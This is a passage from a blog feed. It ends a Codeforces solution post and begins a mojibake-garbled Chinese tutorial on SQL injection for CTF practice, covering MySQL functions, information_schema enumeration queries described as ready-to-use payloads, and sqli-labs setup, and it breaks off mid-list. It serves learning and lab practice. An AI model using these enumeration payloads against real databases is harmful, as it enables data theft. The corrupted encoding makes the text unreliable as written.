class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç°åœ¨ rating è¿˜æ²¡å‡ºæ¥ï¼Œä¸çŸ¥é“èƒ½ä¸èƒ½è“ï¼Œä¸è¿‡æˆ‘çŸ¥é“å¦‚æœ A ä¸å¤±è¯¯æ˜¯ä¸€å®šæœ‰æœºä¼šè“åçš„ï¼Œä¸‹æ¬¡å†æ¥å†å‰å§ã€‚</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://codeforces.com/contest/1675&quot;&gt;Codeforces Round #787 (Div. 3)&lt;/a&gt; é¢˜è§£æ¥äº†ã€‚&lt;/p&gt;
&lt;p&gt;å®å†µåœ¨&lt;a href=&quot;https://www.bilibili.com/video/bv1eF411j7Uz&quot;&gt;è¿™é‡Œ&lt;/a&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="icpc" scheme="http://example.com/categories/icpc/"/>
    
    <category term="codeforces" scheme="http://example.com/categories/icpc/codeforces/"/>
    
    <category term="é¢˜è§£" scheme="http://example.com/categories/icpc/codeforces/%E9%A2%98%E8%A7%A3/"/>
    
    
  </entry>
  
  <entry>
    <title>sqlæ³¨å…¥æ€»ç»“</title>
    <link href="http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2022/05/04/sql%E6%B3%A8%E5%85%A5/</id>
    <published>2022-05-03T16:00:00.000Z</published>
    <updated>2022-05-09T03:39:26.216Z</updated>
    
    <content type="html"><![CDATA[<p>sqlå­¦äº†ä¹Ÿæœ‰ä¸€æ®µæ—¶é—´äº†ï¼Œæƒ³ç€æŠŠèƒ½ç”¨åˆ°çš„çŸ¥è¯†ç‚¹éƒ½å†™ä¸€éå¥½ã€‚</p><span id="more"></span><p>å…ˆçjbæ‰¯å‡ å¥</p><h2 id="WEBæ¡†æ¶"><a href="#WEBæ¡†æ¶" class="headerlink" title="WEBæ¡†æ¶"></a>WEBæ¡†æ¶</h2><p><code>web</code>åº”ç”¨ä¸€æ”¹æˆ‘ä»¬å¹³æ—¶å¸¸è§çš„ <code>p2p</code> å’Œ <code>C/S</code> æ¨¡å¼ï¼Œé‡‡ç”¨ <code>B/S</code> æ¨¡å¼ã€‚éšç€ç½‘ç»œæŠ€æœ¯çš„å‘å±•ï¼Œç‰¹åˆ«éšç€WebæŠ€æœ¯çš„ä¸æ–­æˆç†Ÿï¼ŒB/S è¿™ç§è½¯ä»¶ä½“ç³»ç»“æ„å‡ºç°äº†ã€‚<strong>æµè§ˆå™¨-æœåŠ¡å™¨ï¼ˆBrowser/Serverï¼‰ç»“æ„</strong>ï¼Œç®€ç§° <code>B/S</code> ç»“æ„ï¼Œä¸ <code>C/S</code>ä¸åŒï¼Œå…¶å®¢æˆ·ç«¯ä¸éœ€è¦å®‰è£…ä¸“é—¨çš„è½¯ä»¶ï¼Œåªéœ€è¦æµè§ˆå™¨å³å¯ï¼Œæµè§ˆå™¨ä¸WebæœåŠ¡å™¨äº¤äº’ï¼ŒWebæœåŠ¡å™¨ä¸åç«¯æ•°æ®åº“è¿›è¡Œäº¤äº’ï¼Œå¯ä»¥æ–¹ä¾¿åœ°åœ¨ä¸åŒå¹³å°ä¸‹å·¥ä½œã€‚</p><p>æ¯”å¦‚æˆ‘ä»¬ç©çš„è‹±é›„è”ç›Ÿå°±æ˜¯å…¸å‹çš„ <code>C/S</code> ç»“æ„çš„æœåŠ¡ï¼Œå› ä¸ºæœ‰å¤§é‡å›¾ç‰‡èµ„æºå’Œ <code>3D</code> æ¨¡å‹å­˜å‚¨åœ¨æœ¬åœ°ï¼Œå› æ­¤æå‰å®‰è£…å¥½å®¢æˆ·ç«¯å°±å¯ä»¥æ–¹ä¾¿åœ°ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå¦‚æœé‡‡ç”¨ <code>B/S</code> ç»“æ„çš„è¯ï¼Œåœ¨æˆ‘ä»¬æ¸¸æˆå¼€å§‹çš„æ—¶å€™å°±è¦ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ï¼Œä¸‹è½½å¥½å„ç§èµ„æºåˆ°æœ¬åœ°ï¼Œç„¶åå†ä¸æœåŠ¡å™¨è¿›è¡Œäº¤äº’ï¼Œå„ç§é¡µæ¸¸å‡æ˜¯ <code>B/S</code> ç»“æ„ã€‚<code>B/S</code> çš„ä¼˜åŠ¿å°±æ˜¯å¯¹éœ€è¦æœåŠ¡ä¸€æ–¹çš„ç”µè„‘è¦æ±‚è¾ƒä½ï¼Œå¾ˆå®¹æ˜“å¯ä»¥å…¼å®¹ç³»ç»Ÿä¸Šçš„å·®å¼‚ï¼Œå®¢æˆ·å¾€å¾€åªéœ€è¦å®‰è£…æµè§ˆå™¨ä¾¿å¯ä»¥äº«å—å…¨éƒ¨çš„  <code>web</code> æœåŠ¡ã€‚<code>web</code> åº”ç”¨ä¼šå…ˆå‘æˆ‘ä»¬çš„æµè§ˆå™¨å‘é€å‰ç«¯è¯­è¨€ <code>javascript</code> æˆ–è€… <code>html</code> ç»™æµè§ˆå™¨è§£ææ‰§è¡Œï¼Œæˆ‘ä»¬ç»è¿‡ä¸€å®šçš„æ“ä½œä¹‹åä¼šå‘æœåŠ¡å™¨å‘é€è¯·æ±‚ï¼Œç„¶åæœåŠ¡å™¨æ ¹æ®æˆ‘ä»¬çš„è¯·æ±‚åšå‡ºä¸åŒçš„ç­”å¤ï¼Œè¿™ä¸ªç­”å¤è¿˜æ˜¯å‰ç«¯è¯­è¨€å½¢æˆçš„ç½‘é¡µã€‚</p><p>æœåŠ¡å™¨ä¼šæ ¹æ®ä»€ä¹ˆè§„åˆ™å»å“åº”è¯·æ±‚ï¼Œè¿™ä¸ªå°±è¦ç”¨åˆ°åç«¯è¯­è¨€äº†ï¼Œå¦‚ <code>php</code>,<code>aspx</code> ç­‰éƒ½æ˜¯å¸¸è§çš„åç«¯è¯­è¨€ï¼Œç°åœ¨ä»¥ <code>php</code> ä¸ºä¸»ã€‚æ¯”å¦‚æˆ‘ä»¬å®ç°ä¸€ä¸ªç™»å½•é¡µé¢ï¼Œé‚£ä¹ˆè¿™ä¸ªç™»å½•è‚¯å®šæ˜¯ä¼šç”¨åˆ°æ•°æ®åº“æŸ¥è¯¢æ“ä½œçš„ï¼Œæˆ‘ä»¬å°†è¯·æ±‚æäº¤ç»™æœåŠ¡å™¨ä¹‹åï¼Œåç«¯è¯­è¨€å¾—åˆ°æˆ‘ä»¬å‘é€çš„æ•°æ®ï¼Œç„¶ååç«¯è¯­è¨€å°±ä¼šç›¸åº”åœ°æ„é€  <code>sql</code> è¯­å¥å»æ‰§è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œå¹¶æ ¹æ®æŸ¥è¯¢ç»“æœæ¥å“åº”æˆ‘ä»¬</p><p>é‚£ä¹ˆæˆ‘ä»¬å¾ˆæ¸…æ™°äº†ï¼Œæˆ‘ä»¬è´Ÿè´£å‘é€æ•°æ®ï¼Œ<code>php</code> æ„é€  <code>sql</code> è¯­å¥å»æŸ¥è¯¢ã€‚é¦–å…ˆæ˜ç™½ä¸€ç‚¹ï¼Œ<code>sql</code> è¯­å¥è‚¯å®šæˆ‘ä»¬èƒ½æ§åˆ¶ï¼Œå› ä¸ºæˆ‘è¾“å…¥ä»€ä¹ˆå®ƒå°±è¦å»æŸ¥ä»€ä¹ˆã€‚æˆ‘ä»¬çš„è¾“å…¥ä¸€å®šä¼šè¢«åµŒå…¥ <code>sql</code> è¯­å¥ã€‚å¦‚æœæˆ‘ä»¬åœ¨ <code>sql</code> ä¸­èƒ½è¾“å…¥ä»»æ„å†…å®¹ï¼Œé‚£æˆ‘å°±ç›¸å½“äºç›´æ¥æ§åˆ¶äº†æ•´ä¸ªæ•°æ®åº“ã€‚<code>sql</code> æ³¨å…¥çš„å°±è¿™ä¹ˆäº§ç”Ÿäº†ï¼Œå¸¦æ¥çš„æœ¬è´¨å±å®³ä¹Ÿå°±æ˜¯æ•°æ®åº“ä¿¡æ¯æ³„éœ²ï¼Œå¦‚æœæ•°æ®åº“é…ç½®æƒé™è¿‡é«˜ç”šè‡³èƒ½è®©æ”»å‡»è€…æ‹¿åˆ° <code>shell</code>ã€‚</p><h2 id="sqlè¯­è¨€"><a href="#sqlè¯­è¨€" class="headerlink" title="sqlè¯­è¨€"></a>sqlè¯­è¨€</h2><p><code>SQL</code>(<code>Structured Query Language</code>ï¼Œç»“æ„åŒ–æŸ¥è¯¢è¯­è¨€)æ˜¯ä¸€ç§ç‰¹å®šç›®çš„ç¨‹å¼è¯­è¨€ï¼Œç”¨äºç®¡ç†å…³ç³»æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆ<code>RDBMS</code>ï¼‰ï¼Œæˆ–åœ¨å…³ç³»æµæ•°æ®ç®¡ç†ç³»ç»Ÿï¼ˆ<code>RDSMS</code>ï¼‰ä¸­è¿›è¡Œæµå¤„ç†ã€‚<br><code>SQL</code>åŸºäºå…³ç³»ä»£æ•°å’Œå…ƒç»„å…³ç³»æ¼”ç®—ï¼ŒåŒ…æ‹¬ä¸€ä¸ªæ•°æ®å®šä¹‰è¯­è¨€å’Œæ•°æ®æ“çºµè¯­è¨€ã€‚<code>SQL</code>çš„èŒƒå›´åŒ…æ‹¬æ•°æ®æ’å…¥ã€æŸ¥è¯¢ã€æ›´æ–°å’Œåˆ é™¤ï¼Œæ•°æ®åº“æ¨¡å¼åˆ›å»ºå’Œä¿®æ”¹ï¼Œä»¥åŠæ•°æ®è®¿é—®æ§åˆ¶ã€‚å°½ç®¡<code>SQL</code>ç»å¸¸è¢«æè¿°ä¸ºï¼Œè€Œä¸”å¾ˆå¤§ç¨‹åº¦ä¸Šæ˜¯ä¸€ç§å£°æ˜å¼ç¼–ç¨‹ï¼ˆ<code>4GL</code>ï¼‰ï¼Œä½†æ˜¯å…¶ä¹Ÿå«æœ‰è¿‡ç¨‹å¼ç¼–ç¨‹çš„å…ƒç´ ã€‚(from wiki)</p><p>æˆ‘ä»¬æœ€å¸¸ç”¨çš„æ•°æ®åº“ç³»ç»Ÿæ˜¯<code>mysql</code>ã€‚</p><h2 id="Mysqlå¸¸ç”¨å‡½æ•°"><a href="#Mysqlå¸¸ç”¨å‡½æ•°" class="headerlink" title="Mysqlå¸¸ç”¨å‡½æ•°"></a>Mysqlå¸¸ç”¨å‡½æ•°</h2><h3 id="æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°"><a href="#æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°" class="headerlink" title="æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°"></a>æ•°æ®åº“åŸºæœ¬ä¿¡æ¯å‡½æ•°</h3><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>user()</td><td>ç”¨æˆ·å</td></tr><tr><td>system_user()</td><td>ç³»ç»Ÿç”¨æˆ·å</td></tr><tr><td>curent_user()</td><td>å‰ç”¨æˆ·å</td></tr><tr><td>session_user()</td><td>è¿æ¥æ•°æ®åº“çš„ç”¨æˆ·å</td></tr><tr><td>database()</td><td>å½“å‰é€‰æ‹©çš„æ•°æ®åº“</td></tr><tr><td>version()</td><td>æ•°æ®åº“ç‰ˆæœ¬</td></tr><tr><td>@@data_dir()</td><td>æ•°æ®åº“è·¯å¾„</td></tr><tr><td>@@base_dir()</td><td>æ•°æ®åº“å®‰è£…è·¯å¾„</td></tr><tr><td>@@version_compile_os</td><td>æ“ä½œç³»ç»Ÿ</td></tr></tbody></table><p>æ³¨æ„ï¼Œè¿™äº›å‡½æ•°éƒ½æ— å‚æ•°ä¸”åœ¨ä½¿ç”¨æ—¶å¿…é¡»ä½¿ç”¨ <code>select</code> å…³é”®å­—è¾“å‡ºã€‚</p><h3 id="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"><a href="#å­—ç¬¦ä¸²å¤„ç†å‡½æ•°" class="headerlink" title="å­—ç¬¦ä¸²å¤„ç†å‡½æ•°"></a>å­—ç¬¦ä¸²å¤„ç†å‡½æ•°</h3><p>åœ¨sqlä¸­ï¼Œå­—ç¬¦ä¸²é€šå¸¸ä½¿ç”¨ä¸€å¯¹å•å¼•å·è¡¨ç¤ºã€‚</p><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>concat(s1,s2,s3â€¦)</td><td>æ— ä»»ä½•åˆ†éš”åœ°è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>concat_ws(char,s1,s2,s3â€¦)</td><td>æœ‰åˆ†éš”åœ°è¿æ¥å­—ç¬¦ä¸²</td></tr><tr><td>group_concat(s1)</td><td>è¿æ¥s1åˆ—çš„æ‰€æœ‰è®°å½•å¹¶é€—å·åˆ†éš”</td></tr><tr><td>load_file(file)</td><td>è¯»å–æ–‡ä»¶</td></tr><tr><td>into outfile â€˜fileâ€™</td><td>å†™æ–‡ä»¶</td></tr><tr><td>ascii(str)</td><td>å­—ç¬¦ä¸²çš„ASCIIç å€¼</td></tr><tr><td>ord(str)</td><td>è¿”å›å­—ç¬¦ä¸²ç¬¬ä¸€ä¸ªå­—ç¬¦çš„ASCIå€¼</td></tr><tr><td>mid(str,start,length)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</td></tr><tr><td>substr(str,start,length)</td><td>è¿”å›ä¸€ä¸ªå­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†</td></tr><tr><td>length(str)</td><td>è¿”å›å­—ç¬¦ä¸²é•¿åº¦</td></tr><tr><td>left(str,length)</td><td>è¿”å›å­—ç¬¦ä¸²çš„å‰ç¼€</td></tr><tr><td>rigth(str,length)</td><td>è¿”å›å­—ç¬¦ä¸²çš„åç¼€</td></tr></tbody></table><h3 id="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"><a href="#sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°" class="headerlink" title="sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°"></a>sqlæ³¨å…¥å¸¸ç”¨å‡½æ•°</h3><table><thead><tr><th>å‡½æ•°å</th><th>åŠŸèƒ½</th></tr></thead><tbody><tr><td>extractvalue(xml,Xpath)</td><td>ä½¿ç”¨ XPathtable ç¤ºæ³•ä» XML å­—ç¬¦ä¸²ä¸­æå–å€¼</td></tr><tr><td>UpdateXML(xml,Xpath,replacement)</td><td>è¿”å›æ›¿æ¢çš„ XML ç‰‡æ®µ</td></tr><tr><td>sleep(sec)</td><td>ç¨‹åºä¼‘çœ å¯¹åº”ç§’æ•°</td></tr><tr><td>if(expression,truepart,falsepart)</td><td>å¦‚æœè¡¨è¾¾å¼ä¸ºçœŸè¿”å›ç¬¬äºŒä¸ªå‚æ•°ï¼Œå¦åˆ™è¿”å›ç¬¬ä¸‰ä¸ªå‚æ•°</td></tr><tr><td>char()</td><td>è¿”å›æ•´æ•°ASCIIä»£ç å­—ç¬¦ç»„æˆçš„å­—ç¬¦ä¸²</td></tr><tr><td>strcmp(str1,str2)</td><td>æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²str1&gt;str2è¿”å›1ï¼Œç›¸ç­‰è¿”å›0ï¼Œå¦åˆ™è¿”å›-1</td></tr><tr><td>IFNULL(arg1,arg2)</td><td>å‚æ•°1ä¸ä¸ºNULLè¿”å›å‚æ•°1ï¼Œå¦åˆ™è¿”å›å‚æ•°2</td></tr><tr><td>exp(pow)</td><td>è¿”å›eçš„æŒ‡æ•°å¹‚</td></tr></tbody></table><h2 id="Mysqlå†…ç½®æ•°æ®åº“"><a href="#Mysqlå†…ç½®æ•°æ®åº“" class="headerlink" title="Mysqlå†…ç½®æ•°æ®åº“"></a>Mysqlå†…ç½®æ•°æ®åº“</h2><ul><li><code>Mysql</code>ï¼šä¿å­˜è´¦æˆ·ä¿¡æ¯ï¼Œæƒé™ä¿¡æ¯ï¼Œå­˜å‚¨è¿‡ç¨‹ï¼Œeventï¼Œæ—¶åŒºç­‰ä¿¡æ¯</li><li><code>sys</code>ï¼šåŒ…å«äº†ä¸€ç³»åˆ—çš„å­˜å‚¨è¿‡ç¨‹ã€è‡ªå®šä¹‰å‡½æ•°ä»¥åŠè§†å›¾æ¥å¸®åŠ©æˆ‘ä»¬å¿«é€Ÿçš„äº†è§£ç³»ç»Ÿçš„å…ƒæ•°æ®ä¿¡æ¯ã€‚ï¼ˆå…ƒæ•°æ®æ˜¯å…³äºæ•°æ®çš„æ•°æ®ï¼Œå¦‚æ•°æ®åº“åæˆ–è¡¨åï¼Œåˆ—çš„æ•°æ®ç±»å‹ï¼Œæˆ–è®¿é—®æƒé™ç­‰ï¼‰</li><li><code>performance_schema</code>ï¼šç”¨äºæ”¶é›†æ•°æ®åº“æœåŠ¡å™¨æ€§èƒ½å‚æ•°</li><li><code>information_schema</code>ï¼šå®ƒæä¾›äº†è®¿é—®æ•°æ®åº“å…ƒæ•°æ®çš„æ–¹å¼ã€‚å…¶ä¸­ä¿å­˜ç€å…³äºMySQLæœåŠ¡å™¨æ‰€ç»´æŠ¤çš„æ‰€æœ‰å…¶ä»–æ•°æ®åº“çš„ä¿¡æ¯ã€‚å¦‚æ•°æ®åº“åï¼Œæ•°æ®åº“çš„è¡¨ï¼Œè¡¨çš„æ•°æ®ç±»å‹ä¸è®¿é—®æƒé™ç­‰ã€‚</li></ul><p>è¿™é‡Œçœ‹ä¼¼å¾ˆå¤æ‚ï¼Œå®é™…ä¸Šä½ åªéœ€è¦çŸ¥é“è¿™ä¸ª <code>performance_schema</code> æ•°æ®åº“å°±å¯ä»¥äº†ã€‚å¯¹äºä¸€ä¸ªæœªçŸ¥çš„æ•°æ®åº“ï¼Œæˆ‘ä»¬é¦–å…ˆéœ€è¦çŸ¥é“å®ƒçš„æ•°æ®åº“åï¼Œæ•°æ®è¡¨åï¼ŒçŸ¥é“è¡¨åä¹‹åè¿˜å¾—çŸ¥é“å­—æ®µåï¼Œè¿™æ ·æˆ‘ä»¬æ‰èƒ½ä½¿ç”¨ç±»ä¼¼è¿™æ ·çš„ <code>sql</code> è¯­å¥ <code>select å­—æ®µå from  æ•°æ®åº“.è¡¨å;</code> å»æ³„éœ²æ•°æ®åº“çš„å…·ä½“ä¿¡æ¯ã€‚</p><p>æˆ‘ä»¬ <code>navicat</code> æ‰“å¼€è¿™ä¸ªæ•°æ®åº“è§‚å¯Ÿä¸€ä¸‹æœ‰ä»€ä¹ˆè¡¨</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png" alt="1"> </p><p>çœ‹ç€å¾ˆå¤šï¼Œå…¶å®æˆ‘ä»¬åªéœ€è¦å…³å¿ƒä¸‰ä¸ªè¡¨ï¼š<code>schemata</code>ï¼Œ<code>tables</code>ï¼Œ<code>columns</code>ï¼Œå®ƒä»¬åˆ†åˆ«èƒ½çˆ†å‡ºæ•°æ®åº“åï¼Œè¡¨åå’Œå­—æ®µåã€‚</p><p>æˆ‘ä»¬å…ˆçœ‹çœ‹ç¬¬ä¸€ä¸ªè¡¨ <code>schemata</code> çš„å…·ä½“ä¿¡æ¯ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/2.png" alt="2"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢çš„<code>schema_name</code> å­—æ®µçš„å€¼å°±æ˜¯æˆ‘ä»¬å½“å‰è¿™ä¸ªæ•°æ®åº“ç³»ç»Ÿä¸­æ‰€æœ‰çš„æ•°æ®åº“çš„åå­—ï¼Œä»å·¦è¾¹ä¹Ÿå¯ä»¥ä¸€ä¸€å¯¹åº”çœ‹åˆ°å¯¹åº”çš„æ•°æ®åº“ã€‚</p><p>ç„¶åçœ‹çœ‹ç¬¬äºŒä¸ªè¡¨ <code>tables</code> çš„ä¿¡æ¯ã€‚å› ä¸ºæœ‰ç‚¹å¤šæˆ‘ä»¬çœ‹ä¸»è¦çš„ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/3.png" alt="3"></p><p>å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ª <code>table_name</code> å­—æ®µå°±æ˜¯æ•´ä¸ªæ•°æ®åº“ç³»ç»Ÿçš„æ‰€æœ‰è¡¨åï¼Œç„¶åå‰é¢çš„ <code>table_schema</code> å°±æ˜¯è¿™ä¸ªè¡¨å¯¹åº”çš„æ•°æ®åº“åã€‚è¿™é‡Œä¹Ÿå¯ä»¥çœ‹åˆ°æˆ‘ä»¬è¿™ä¸ªæ•°æ®åº“èƒ½ä»ä¸­æ‰¾åˆ° <code>tables</code> å’Œ <code>schemata</code> è¿™ä¸¤ä¸ªè¡¨åï¼Œä»¥åŠå…¶å®ƒä¹±ä¸ƒå…«ç³Ÿçš„åœ¨ä¸Šä¸€å¼ å›¾ä¹Ÿéƒ½æœ‰æ˜¾ç¤ºã€‚</p><h2 id="è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼"><a href="#è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼" class="headerlink" title="è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼"></a>è·å¾—æ•°æ®åº“ä¿¡æ¯çš„å…¶å®ƒæ–¹å¼</h2><p>åœ¨æˆ‘ä»¬æœ‰ä¸€ä¸ª <code>mysql</code> è¿æ¥çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬æƒ³æŸ¥çœ‹æ‰€æœ‰çš„æ•°æ®åº“å¾ˆç®€å•ï¼Œä¸€å¥ <code>show databases;</code> å³å¯è§£å†³ï¼Œä½†æ˜¯é€šå¸¸æƒ…å†µä¸‹æˆ‘ä»¬è¿™æ ·å­è¾“å…¥å¹¶ä¸èƒ½å¾ˆå¥½çš„å›æ˜¾ï¼Œå¦‚æœæŠŠæ•°æ®åº“åä½œä¸ºä¸€æ¡è®°å½•è¾“å‡ºå‡ºæ¥é‚£å¤„ç†èµ·æ¥ä¼šå¥½å¾ˆå¤šã€‚</p><p>æˆ‘ä»¬æƒ³æŸ¥çœ‹æ•°æ®åº“è¿˜å¯ä»¥ç”¨è¿™ç§æ–¹å¼ï¼š</p><p><code>select schema_name from information_schema.schemata;</code></p><p>æˆ‘ä»¬å¯¹æ¯”ä¸€ä¸‹ä¸¤ä¸ªæŒ‡ä»¤çš„ç»“æœ</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/4.png" alt="4"></p><p>å¯ä»¥çœ‹åˆ°ç»“æœåŸºæœ¬å°±æ˜¯ä¸€æ ·çš„ã€‚ç„¶åæˆ‘ä»¬æƒ³æŸ¥çœ‹æ¯”å¦‚è¯´ <code>world</code> æ•°æ®åº“çš„è¡¨åï¼Œæˆ‘ä»¬ä¸€èˆ¬å…ˆ <code>use world</code> å† <code>show tables</code> æˆ–è€…ä¸€å¥è¯ <code>show tables from world;</code> ç›´æ¥è¾“å‡ºè¡¨åï¼Œä½†æ˜¯æœ‰ <code>information_schema</code> è¿™ä¸ªæ•°æ®åº“ï¼Œæˆ‘ä»¬å°±èƒ½é€šè¿‡è¿™é‡ŒæŠŠä¿¡æ¯æ˜¾ç¤ºå‡ºæ¥ã€‚</p><p><code>select table_name from information_schema.tables where table_schema=&#39;world&#39;;</code></p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/5.png" alt="5"></p><p>å¯ä»¥çœ‹åˆ°ç»“æœä¹Ÿæ˜¯ä¸€æ¨¡ä¸€æ ·çš„ã€‚</p><p>å‰©ä¸‹çš„çˆ†å­—æ®µå°±ä¸æ¼”ç¤ºäº†ï¼ŒåŒç†çš„ã€‚</p><p><code>select column_name from information_schema.columns where table_name=&#39;city&#39;;</code></p><p>ä»¥ä¸Šçš„ <code>payload</code> å¯ä»¥ç›´æ¥åœ¨æ³¨å…¥çš„åœ°æ–¹åŠ è¿›å»ï¼Œåªéœ€è¦æ”¹ä¸€ä¸‹è¡¨åå’Œæ•°æ®åº“åå³å¯ã€‚</p><h2 id="sqli-labsç¯å¢ƒæ­å»º"><a href="#sqli-labsç¯å¢ƒæ­å»º" class="headerlink" title="sqli-labsç¯å¢ƒæ­å»º"></a>sqli-labsç¯å¢ƒæ­å»º</h2><p>ä¸»è¦å­¦ä¹ çš„ç¯å¢ƒè¿˜æ˜¯ç”¨çš„ <a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> ï¼Œæˆ‘æ˜¯ç›´æ¥åœ¨ä¸»æœºä¸Šæ­å»ºï¼Œå› ä¸ºä¿®æ”¹ä»£ç èµ·æ¥ååˆ†æ–¹ä¾¿ï¼Œä¸€æ”¹å°±èƒ½è§åˆ°æ•ˆæœã€‚ä½†æ˜¯è¿™ä¹ˆåšç¡®ä¿åˆ‡æ–­äº†å¯¹å¤–ç•Œçš„ç½‘ç»œè¿æ¥ï¼Œæˆ–è€…å¿ƒå¤§ä¸€ç‚¹å°±ç®—äº†ï¼Œæƒ³ç€æ²¡äººä¼šå¯¹è‡ªå·±çš„ä¸»æœºå‘èµ·è¿›æ”»çš„ã€‚</p><p>ç„¶åè‡ªå·±å†æ­å»ºä¸€ä¸ª <code>web</code> æœåŠ¡ï¼Œèƒ½è®¿é—®å°±ç®—æˆåŠŸäº†ã€‚</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/6.png" alt="6"></p><p>åœ¨ä½¿ç”¨ä¹‹å‰åœ¨ <code>sqli-labs\sql-connections\</code> ç›®å½•ä¸‹çš„ <code>db-creds.inc</code> ä¸­é…ç½®ä¸€ä¸‹è‡ªå·±çš„ç”¨æˆ·åå’Œå¯†ç ï¼Œå†ç‚¹å‡» <code>setup</code> æŠŠæ•°æ®åº“å…ˆé…ç½®å¥½ï¼Œå¦‚æœä¸€åˆ‡OKï¼Œé‚£ä¹ˆè¿›å…¥ç¬¬ä¸€å…³çš„æ•ˆæœåº”è¯¥æ˜¯è¿™æ ·çš„ï¼š</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/7.png" alt="7"></p><h2 id="sqlæ³¨å…¥è¯¦è§£"><a href="#sqlæ³¨å…¥è¯¦è§£" class="headerlink" title="sqlæ³¨å…¥è¯¦è§£"></a>sqlæ³¨å…¥è¯¦è§£</h2><p>åœ¨å¯¹ä¸€ä¸ª <code>ctf</code> æ‰“ <code>sql</code> æ³¨å…¥çš„æ—¶å€™ï¼Œæˆ‘ä»¬ç¬¬ä¸€æ­¥å°±æ˜¯è¦å¯»æ‰¾<strong>æ³¨å…¥ç‚¹</strong>ã€‚æ€ä¹ˆå¯»æ‰¾æ³¨å…¥ç‚¹å‘¢ï¼Œå› ä¸ºåç«¯æºç æˆ‘ä»¬éƒ½æ˜¯ä¸çŸ¥é“çš„ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½é€šè¿‡æŠ“åŒ…çš„æ–¹å¼è§‚å¯Ÿæ‰€æœ‰èƒ½<strong>æäº¤çš„å‚æ•°</strong>è¿›è¡Œ <code>sql</code> æ³¨å…¥çš„æµ‹è¯•ã€‚</p><p>æ‰¾åˆ°æ³¨å…¥ç‚¹ä¹‹åæˆ‘ä»¬è¿˜éœ€è¦åˆ¤æ–­æ³¨å…¥çš„ç±»å‹ã€‚å¤§ä½“çš„æ³¨å…¥åˆ†ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯<strong>æœ‰å›æ˜¾çš„æ³¨å…¥</strong>ï¼Œå¦ä¸€ç±»æ˜¯<strong>æ²¡æœ‰å›æ˜¾çš„æ³¨å…¥</strong>ã€‚ä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬ä¼˜å…ˆè€ƒè™‘æœ‰å›æ˜¾çš„æ³¨å…¥ï¼Œå› ä¸ºæ—¶é—´æˆæœ¬æ¯”è¾ƒä½ï¼Œé‚£ä¹ˆæˆ‘ä»¬å…ˆæ¥çœ‹çœ‹æœ‰å›æ˜¾çš„æ³¨å…¥å§ã€‚</p><h3 id="æœ‰å›æ˜¾çš„æ³¨å…¥"><a href="#æœ‰å›æ˜¾çš„æ³¨å…¥" class="headerlink" title="æœ‰å›æ˜¾çš„æ³¨å…¥"></a>æœ‰å›æ˜¾çš„æ³¨å…¥</h3><p>ä»€ä¹ˆå«æœ‰å›æ˜¾ï¼ŸæŸ¥è¯¢åˆ°çš„æ•°æ®åº“ä¿¡æ¯ä¼š<strong>ç›´æ¥æ˜¾ç¤º</strong>å‡ºæ¥ï¼Œä½ èƒ½çœ‹åˆ°çš„å°±å«æœ‰å›æ˜¾ï¼Œåä¹‹åˆ™æ˜¯æ²¡æœ‰å›æ˜¾ã€‚æœ‰å›æ˜¾çš„æ³¨å…¥æœ‰ä»¥ä¸‹ç±»å‹ï¼š</p><ol><li>è”åˆæŸ¥è¯¢çš„æ³¨å…¥ï¼šé€šè¿‡unionå…³é”®å­—æ³„éœ²æ•°æ®åº“ä¿¡æ¯</li><li>å †å æ³¨å…¥ï¼šé€šè¿‡é‡æ–°æ‰§è¡Œä¸€ä¸ª <code>sql</code> 